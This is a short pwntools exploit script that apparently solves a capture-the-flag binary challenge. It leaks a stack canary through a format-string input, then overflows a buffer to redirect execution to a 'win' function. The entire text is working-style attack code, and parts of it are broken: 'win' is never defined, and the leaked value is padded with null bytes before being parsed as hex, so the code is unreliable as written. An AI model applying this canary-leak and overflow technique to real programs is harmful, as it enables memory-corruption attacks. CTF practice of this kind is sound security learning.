from pwn import *

io = process("./chal_64")

elf = context.binary = ELF("./chal_64", checksec=False)


io.sendlineafter(b'Input: \n', '%15$p')

canary = int(io.recvline().strip().ljust(8,b'\x00'),16)
print(f'leaked canary: {hex(canary)}')

offset = 72
payload = b'A'*offset + p64(canary) + b'A'*8 + p64(win)

io.sendlineafter(b'2nd Input: \n', payload)

io.interactive()

